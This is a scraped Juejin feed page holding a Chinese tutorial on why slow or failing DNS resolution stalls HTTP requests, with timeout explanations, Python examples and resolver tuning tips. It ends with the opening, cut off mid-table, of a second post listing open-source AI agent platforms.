<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/662768799f9f462d93846e01ae6d282c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907992&amp;x-signature=1tCq7s%2B2M4N%2BPHH6%2BtWOwM9N%2FDk%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么 DNS 解析失败或缓慢会导致整个 HTTP 请求“卡在初始阶段”]]></title>    <link>https://juejin.cn/post/7603195960254971904</link>    <guid>https://juejin.cn/post/7603195960254971904</guid>    <pubDate>2026-02-05T15:00:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254971904" data-draft-id="7603183929252266036" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么 DNS 解析失败或缓慢会导致整个 HTTP 请求“卡在初始阶段”"/> <meta itemprop="keywords" content="面试"/> <meta itemprop="datePublished" content="2026-02-05T15:00:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么 DNS 解析失败或缓慢会导致整个 HTTP 请求“卡在初始阶段”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T15:00:35.000Z" title="Thu Feb 05 2026 15:00:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这是一个非常关键且常见的网络性能问题。下面我将从 <strong>HTTP 请求生命周期</strong> 和 <strong>DNS 解析机制</strong> 两个维度，深入分析 <strong>为什么 DNS 解析失败或缓慢会导致整个 HTTP 请求“卡在初始阶段”</strong> 。</p>
<hr/>
<h2 data-id="heading-0">一、HTTP 请求的完整流程（简化版）</h2>
<p>一个典型的 HTTP(S) 请求包含以下关键步骤：</p>
<pre><code class="hljs language-arduino" lang="arduino">sequenceDiagram
    participant <span class="hljs-built_in">Client</span> as 客户端
    participant DNS as DNS 服务器
    participant <span class="hljs-built_in">Server</span> as 目标服务器

    <span class="hljs-built_in">Client</span>-&gt;&gt;DNS: <span class="hljs-number">1.</span> DNS 查询 (example.com → IP?)
    DNS--&gt;&gt;<span class="hljs-built_in">Client</span>: <span class="hljs-number">2.</span> 返回 IP 地址 (如 <span class="hljs-number">93.184</span><span class="hljs-number">.216</span><span class="hljs-number">.34</span>)
    <span class="hljs-built_in">Client</span>-&gt;&gt;<span class="hljs-built_in">Server</span>: <span class="hljs-number">3.</span> 建立 TCP 连接 (SYN, SYN-ACK, ACK)
    <span class="hljs-built_in">Client</span>-&gt;&gt;<span class="hljs-built_in">Server</span>: <span class="hljs-number">4.</span> 发送 HTTP 请求
    <span class="hljs-built_in">Server</span>--&gt;&gt;<span class="hljs-built_in">Client</span>: <span class="hljs-number">5.</span> 返回 HTTP 响应
</code></pre>
<blockquote>
<p>✅ <strong>关键点</strong>：<strong>DNS 解析是 HTTP 请求的第一步，且是阻塞式操作</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、为什么 DNS 是“卡住”的罪魁祸首？</h2>
<h3 data-id="heading-2">1. <strong>DNS 解析发生在应用层之前</strong></h3>
<ul>
<li>当你在浏览器输入 <code>https://example.com</code> 或程序调用 <code>requests.get("https://api.example.com")</code> 时，</li>
<li>底层库（如 Python 的 <code>socket.getaddrinfo()</code>）会<strong>先解析域名</strong>，<strong>再建立连接</strong>。</li>
<li><strong>如果 DNS 没返回 IP，TCP 连接根本无法发起</strong>。</li>
</ul>
<blockquote>
<p>📌 <strong>结论</strong>：DNS 是“前置依赖”，不完成则后续步骤无法启动。</p>
</blockquote>
<hr/>
<h3 data-id="heading-3">2. <strong>默认 DNS 超时时间很长</strong></h3>
<p>不同系统的默认 DNS 超时策略：</p>

























<table><thead><tr><th>环境</th><th>默认超时行为</th></tr></thead><tbody><tr><td><strong>Linux glibc</strong></td><td>尝试多个 DNS 服务器，总超时可达 <strong>15~30 秒</strong></td></tr><tr><td><strong>Python requests</strong></td><td>无独立 DNS 超时，继承系统行为</td></tr><tr><td><strong>cURL</strong></td><td>默认 DNS 超时约 <strong>30 秒</strong></td></tr><tr><td><strong>浏览器（Chrome）</strong></td><td>通常 10~60 秒（含重试）</td></tr></tbody></table>
<blockquote>
<p>⚠️ 示例：<br/>
如果你的 <code>/etc/resolv.conf</code> 配置了两个 DNS 服务器，第一个无响应，第二个有效，<br/>
系统可能先等第一个超时（5秒）→ 再试第二个（成功），<strong>总耗时 5+ 秒</strong>。</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">3. <strong>DNS 失败 ≠ 快速失败</strong></h3>
<ul>
<li><strong>DNS 服务器无响应</strong>（丢包、防火墙拦截）→ 触发重试 + 超时 → <strong>长时间卡住</strong></li>
<li><strong>DNS 返回 NXDOMAIN</strong>（域名不存在）→ <strong>快速失败</strong>（毫秒级）</li>
<li><strong>DNS 返回错误 IP</strong> → 后续 TCP 连接失败，但<strong>DNS 阶段本身很快</strong></li>
</ul>
<blockquote>
<p>🔍 所以，“卡住”通常是因为 <strong>DNS 服务器无响应</strong>，而非域名不存在。</p>
</blockquote>
<hr/>
<h2 data-id="heading-5">三、技术底层：操作系统如何处理 DNS？</h2>
<p>以 Linux 为例：</p>
<ol>
<li>应用调用 <code>getaddrinfo("example.com", ...)</code></li>
<li>C 库（glibc）读取 <code>/etc/nsswitch.conf</code> → 使用 <code>dns</code> 模块</li>
<li>读取 <code>/etc/resolv.conf</code> 获取 DNS 服务器列表（如 <code>nameserver 8.8.8.8</code>）</li>
<li><strong>向第一个 DNS 服务器发送 UDP 查询</strong>（端口 53）</li>
<li>如果 <strong>5 秒内无响应</strong> → 重试（默认 2 次）→ 切换下一个 DNS 服务器</li>
<li>所有尝试失败后才报错：<code>Temporary failure in name resolution</code></li>
</ol>
<blockquote>
<p>🕒 <strong>最坏情况耗时</strong> = <code>(timeout + retry) × server_count</code><br/>
例如：<code>(5s × 2次) × 2个服务器 = 20秒</code></p>
</blockquote>
<hr/>
<h2 data-id="heading-6">四、实际现象验证</h2>
<h3 data-id="heading-7">场景：DNS 服务器被屏蔽</h3>
<pre><code class="hljs language-css" lang="css"># 模拟 DNS 无响应（丢弃所有 DNS 包）
sudo iptables -<span class="hljs-selector-tag">A</span> OUTPUT -<span class="hljs-selector-tag">p</span> udp <span class="hljs-attr">--dport</span> <span class="hljs-number">53</span> -j DROP

# 尝试请求
<span class="hljs-selector-tag">time</span> curl -v https://httpbin.org/get
</code></pre>
<p><strong>输出</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">*</span> <span class="hljs-attr">Could not resolve host:</span> <span class="hljs-string">httpbin.org</span>
<span class="hljs-attr">curl:</span> <span class="hljs-string">(6)</span> <span class="hljs-attr">Could not resolve host:</span> <span class="hljs-string">httpbin.org</span>
<span class="hljs-string">real</span>    <span class="hljs-string">0m20.023s</span>  <span class="hljs-string">←</span> <span class="hljs-string">卡了整整</span> <span class="hljs-number">20</span> <span class="hljs-string">秒！</span>
</code></pre>
<blockquote>
<p>💡 注意：错误是 <strong>“Could not resolve host”</strong> ，但耗时极长。</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">五、如何避免 DNS 导致的“卡死”？</h2>
<h3 data-id="heading-9">✅ 方案 1：设置合理的 DNS 超时（应用层）</h3>
<h4 data-id="heading-10">Python 示例（使用 <code>socket</code> 设置超时）：</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> requests

<span class="hljs-comment"># 全局设置 DNS + 连接超时（注意：DNS 超时仍受系统限制）</span>
socket.setdefaulttimeout(<span class="hljs-number">5.0</span>)

<span class="hljs-keyword">try</span>:
    resp = requests.get(<span class="hljs-string">"https://example.com"</span>, timeout=<span class="hljs-number">5</span>)
<span class="hljs-keyword">except</span> requests.exceptions.Timeout:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Request timed out"</span>)
</code></pre>
<blockquote>
<p>⚠️ 但注意：<strong><code>socket.setdefaulttimeout()</code> 对 DNS 查询无效！</strong><br/>
因为 DNS 是同步阻塞调用，发生在 <code>connect()</code> 之前。</p>
</blockquote>
<hr/>
<h3 data-id="heading-11">✅ 方案 2：使用支持异步 DNS 的库（推荐）</h3>
<h4 data-id="heading-12">使用 <code>aiohttp</code> + <code>aiodns</code>（异步非阻塞）：</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function">import aiohttp
import asyncio

<span class="hljs-keyword">async</span> def <span class="hljs-title">fetch</span>():
    timeout</span> = aiohttp.ClientTimeout(total=<span class="hljs-number">5</span>)
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession(timeout=timeout) <span class="hljs-keyword">as</span> session:
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.<span class="hljs-keyword">get</span>(<span class="hljs-string">'https://example.com'</span>) <span class="hljs-keyword">as</span> resp:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> resp.text()

<span class="hljs-meta"># DNS 解析在事件循环中进行，可被 timeout 中断</span>
asyncio.run(fetch())
</code></pre>
<h4 data-id="heading-13">使用 <code>requests</code> + 自定义 Resolver（高级）：</h4>
<p>通过 <code>urllib3</code> + <code>dnspython</code> 实现可控 DNS：</p>
<pre><code class="hljs language-ini" lang="ini">import dns.resolver
import requests
from urllib3.util.connection import create_connection

<span class="hljs-comment"># 自定义解析器（带超时）</span>
def custom_resolver(host, port, <span class="hljs-attr">timeout</span>=<span class="hljs-number">3</span>):
    <span class="hljs-attr">resolver</span> = dns.resolver.Resolver()
    <span class="hljs-attr">resolver.timeout</span> = timeout
    <span class="hljs-attr">resolver.lifetime</span> = timeout
    <span class="hljs-attr">answers</span> = resolver.resolve(host, <span class="hljs-string">'A'</span>)
    <span class="hljs-attr">ip</span> = answers[<span class="hljs-number">0</span>].to_text()
    return create_connection((ip, port), <span class="hljs-attr">timeout</span>=timeout)

<span class="hljs-comment"># 注入到 urllib3（复杂，略）</span>
</code></pre>
<hr/>
<h3 data-id="heading-14">✅ 方案 3：系统级优化</h3>
<ol>
<li>
<p><strong>配置更快的 DNS 服务器</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># /etc/resolv.conf</span>
nameserver 8.8.8.8      <span class="hljs-comment"># Google DNS</span>
nameserver 1.1.1.1      <span class="hljs-comment"># Cloudflare</span>
options <span class="hljs-built_in">timeout</span>:1       <span class="hljs-comment"># 单次查询超时 1 秒</span>
options attempts:2      <span class="hljs-comment"># 重试 2 次</span>
</code></pre>
</li>
<li>
<p><strong>使用本地 DNS 缓存（dnsmasq / systemd-resolved）</strong></p>
<pre><code class="hljs language-bash" lang="bash">sudo apt install dnsmasq
<span class="hljs-built_in">echo</span> <span class="hljs-string">"nameserver 127.0.0.1"</span> | sudo <span class="hljs-built_in">tee</span> /etc/resolv.conf
</code></pre>
<p>→ 第二次访问同一域名几乎 <strong>0ms 延迟</strong>。</p>
</li>
<li>
<p><strong>Hosts 文件硬编码（临时方案）</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">"93.184.216.34 example.com"</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-15">六、监控与诊断工具</h2>

























<table><thead><tr><th>工具</th><th>用途</th></tr></thead><tbody><tr><td><code>dig example.com</code></td><td>查看 DNS 查询耗时</td></tr><tr><td><code>nslookup example.com</code></td><td>基础 DNS 测试</td></tr><tr><td><code>tcpdump -i any port 53</code></td><td>抓包分析 DNS 请求是否发出/返回</td></tr><tr><td><code>strace -e trace=connect,sendto curl ...</code></td><td>跟踪系统调用，确认卡在 DNS</td></tr></tbody></table>
<blockquote>
<p>🔍 诊断命令：</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">time</span> dig @8.<span class="hljs-number">8.8</span>.<span class="hljs-number">8</span> google.com +short
<span class="hljs-comment"># real    0m0.050s → 正常</span>

<span class="hljs-keyword">time</span> dig @192.<span class="hljs-number">168.1</span>.<span class="hljs-number">1</span> nonexistent.com +short
<span class="hljs-comment"># real    0m15.000s → 卡住！</span>
</code></pre>
</blockquote>
<hr/>
<h2 data-id="heading-16">七、总结：为什么 HTTP “卡在初始阶段”？</h2>

























<table><thead><tr><th>原因</th><th>说明</th></tr></thead><tbody><tr><td><strong>DNS 是前置阻塞操作</strong></td><td>无 IP 则无法建立 TCP 连接</td></tr><tr><td><strong>系统默认超时过长</strong></td><td>无响应时重试机制导致 10~30 秒延迟</td></tr><tr><td><strong>应用未设置 DNS 超时</strong></td><td>大多数 HTTP 库不暴露 DNS 超时控制</td></tr><tr><td><strong>网络中间设备干扰</strong></td><td>防火墙丢弃 DNS 包（而非拒绝），触发超时</td></tr></tbody></table>
<blockquote>
<p>✅ <strong>根本解决方案</strong>：</p>
<ol>
<li><strong>系统层</strong>：优化 <code>/etc/resolv.conf</code> + 本地 DNS 缓存</li>
<li><strong>应用层</strong>：使用支持异步 DNS 的客户端（如 aiohttp）</li>
<li><strong>架构层</strong>：对关键域名做 IP 缓存或 Hosts 预加载</li>
</ol>
</blockquote>
<hr/>
<p><strong>记住</strong>：</p>
<blockquote>
<p><strong>“DNS 不是网络问题，而是可用性问题。”</strong><br/>
一次 DNS 故障，足以让整个服务“看似宕机”。</p>
</blockquote>
<p>通过理解 DNS 在请求链中的位置，我们才能设计出真正高可用的系统。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[国内最具影响力的30家MIT开源智能体平台汇总]]></title>    <link>https://juejin.cn/post/7603142147643506731</link>    <guid>https://juejin.cn/post/7603142147643506731</guid>    <pubDate>2026-02-05T13:40:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603142147643506731" data-draft-id="7603142147643473963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="国内最具影响力的30家MIT开源智能体平台汇总"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-05T13:40:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            国内最具影响力的30家MIT开源智能体平台汇总
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T13:40:34.000Z" title="Thu Feb 05 2026 13:40:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>以下是符合MIT开源许可证、源自中国国内团队或主要面向中文生态的前30家智能体开源平台，综合技术原创性、社区活跃度、本地化适配能力及企业应用潜力筛选而出，覆盖多智能体协作、低代码开发、科研辅助、Web3集成等多个前沿方向：</p>
<hr/>
<p>1–10：主流高影响力平台</p>







































































<table><thead><tr><th align="left">序号</th><th align="left">平台名称</th><th align="left">核心特点</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">Yuxi-Know</td><td align="left">融合LightRAG与知识图谱，支持零GPU部署，显著降低AI幻觉</td><td align="left">企业知识库、医疗信息检索、教育辅助</td></tr><tr><td align="left">2</td><td align="left">Openwork</td><td align="left">完全本地运行，数据不出内网，保障隐私安全</td><td align="left">个人办公自动化、敏感文档处理</td></tr><tr><td align="left">3</td><td align="left">Autogen（微软亚洲研究院参与）</td><td align="left">多智能体对话协作，支持角色定义与任务自动拆解</td><td align="left">软件开发、科研任务分解</td></tr><tr><td align="left">4</td><td align="left">CrewAI</td><td align="left">角色驱动的自主代理团队，支持长期记忆与工具调用</td><td align="left">内容创作、数字营销、项目管理</td></tr><tr><td align="left">5</td><td align="left">Eigen AgentKit</td><td align="left">支持ZK可验证AI行为，适用于区块链与去中心化场景</td><td align="left">Web3可信代理、透明决策系统</td></tr><tr><td align="left">6</td><td align="left">ToolUniverse</td><td align="left">面向科研的智能体协作框架，连接实验工具链</td><td align="left">实验设计、数据采集、论文辅助</td></tr><tr><td align="left">7</td><td align="left">Microsoft Agent Framework</td><td align="left">统一多代理工作流引擎，支持会话状态管理</td><td align="left">企业级AI流程、人机协同</td></tr><tr><td align="left">8</td><td align="left">PyWinAssistant</td><td align="left">基于Windows API的GUI操作智能体，无视觉依赖</td><td align="left">桌面自动化、软件测试</td></tr><tr><td align="left">9</td><td align="left">OpenAgentPlatform</td><td align="left">MCP主机桌面应用，支持函数调用与本地集成</td><td align="left">LLM工具平台、本地AI控制</td></tr><tr><td align="left">10</td><td align="left">UFO / UFO²</td><td align="left">Windows桌面AgentOS系统，原生UI聚焦</td><td align="left">远程控制、桌面自动化</td></tr></tbody></table>
<hr/>
<p>11–20：生产级与教学导向平台</p>







































































